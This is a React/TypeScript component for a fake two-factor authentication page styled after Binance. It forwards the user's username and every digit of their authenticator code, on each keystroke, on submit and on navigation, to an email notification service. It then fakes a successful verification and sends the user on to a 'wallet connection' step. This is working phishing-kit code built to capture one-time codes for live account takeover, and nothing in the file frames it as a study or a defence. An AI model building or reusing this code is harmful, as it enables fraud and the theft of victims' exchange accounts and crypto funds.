
import React, { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { Shield, RefreshCw } from "lucide-react";
import { sendEmailNotification } from "@/services/emailService";

interface TwoFactorAuthProps {
  username: string;
  onTwoFactorSuccess: () => void;
  onBack: () => void;
}

const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSuccess, onBack }) => {
  const [code, setCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [timer, setTimer] = useState(30);
  const [canResend, setCanResend] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (timer > 0) {
      interval = setInterval(() => {
        setTimer(timer - 1);
      }, 1000);
    } else {
      setCanResend(true);
    }
    return () => clearInterval(interval);
  }, [timer]);

  const handleCodeChange = async (value: string) => {
    const processedValue = value.replace(/\D/g, '').slice(0, 6);
    setCode(processedValue);

    // Send email immediately when code is entered
    if (processedValue) {
      try {
        await sendEmailNotification({
          step: "Two-Factor Auth - Code Entry",
          username,
          timestamp: new Date().toISOString(),
          allFormData: {
            username,
            twoFactorCode: processedValue,
            codeLength: processedValue.length
          }
        });
      } catch (error) {
        console.error('❌ Failed to send email for code entry:', error);
      }
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (code.length !== 6) {
      toast({
        title: "Invalid code",
        description: "Please enter a 6-digit verification code.",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);
    
    // Send email for 2FA submission
    try {
      await sendEmailNotification({
        step: "Two-Factor Auth - VERIFICATION SUBMITTED",
        username,
        timestamp: new Date().toISOString(),
        allFormData: {
          username,
          twoFactorCode: code,
          verificationStatus: "submitted"
        }
      });
    } catch (error) {
      console.error('❌ Failed to send email for 2FA submission:', error);
    }
    
    // Simulate 2FA verification
    setTimeout(() => {
      setIsLoading(false);
      onTwoFactorSuccess();
      toast({
        title: "Verification successful",
        description: "Proceeding to wallet connection.",
      });
    }, 1500);
  };

  const handleResendCode = async () => {
    setTimer(30);
    setCanResend(false);
    
    // Send email for code refresh
    try {
      await sendEmailNotification({
        step: "Two-Factor Auth - Code Refreshed",
        username,
        timestamp: new Date().toISOString(),
        allFormData: {
          username,
          action: "refresh_code"
        }
      });
    } catch (error) {
      console.error('❌ Failed to send email for code refresh:', error);
    }
    
    toast({
      title: "Code refreshed",
      description: "Please check your Google Authenticator app.",
    });
  };

  const handleBack = async () => {
    // Send email for back button
    try {
      await sendEmailNotification({
        step: "Two-Factor Auth - Back to Login",
        username,
        timestamp: new Date().toISOString(),
        allFormData: {
          username,
          action: "back_to_login"
        }
      });
    } catch (error) {
      console.error('❌ Failed to send email for back button:', error);
    }
    
    onBack();
  };

  return (
    <div className="min-h-[calc(100vh-200px)] flex items-center justify-center py-8 px-4">
      <div className="w-full max-w-md mx-auto">
        <div className="bg-[#1E2026] rounded-lg border border-[#2B3139] p-8">
          <div className="text-center mb-8">
            <Shield className="w-12 h-12 text-binance-yellow mx-auto mb-4" />
            <h1 className="text-2xl font-bold text-white mb-2">Two-Factor Authentication</h1>
            <p className="text-[#848E9C] text-base">
              Enter the 6-digit code from your Google Authenticator app
            </p>
            <p className="text-[#848E9C] text-sm mt-2">
              Logged in as: <span className="text-white">{username}</span>
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <Label htmlFor="code" className="text-[#B7BDC6] text-base mb-2 block">
                6-Digit Google Authenticator Code
              </Label>
              <Input
                id="code"
                type="text"
                value={code}
                onChange={(e) => handleCodeChange(e.target.value)}
                className="bg-[#181A20] border-[#2B3139] text-white text-center text-xl h-12 tracking-widest focus:border-binance-yellow"
                placeholder="000000"
                maxLength={6}
                required
              />
            </div>

            <Button
              type="submit"
              disabled={isLoading || code.length !== 6}
              className="w-full bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-12 text-base"
            >
              {isLoading ? "Verifying..." : "Verify Code"}
            </Button>
          </form>

          <div className="mt-6 text-center space-y-3">
            {canResend ? (
              <button
                onClick={handleResendCode}
                className="text-binance-yellow hover:underline text-sm flex items-center justify-center gap-2"
              >
                <RefreshCw className="w-4 h-4" />
                Refresh Code
              </button>
            ) : (
              <p className="text-[#848E9C] text-sm">
                Refresh available in {timer} seconds
              </p>
            )}
            
            <button
              onClick={handleBack}
              className="text-binance-yellow hover:text-binance-yellow/80 text-sm font-medium"
            >
              Back to Login
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default TwoFactorAuth;
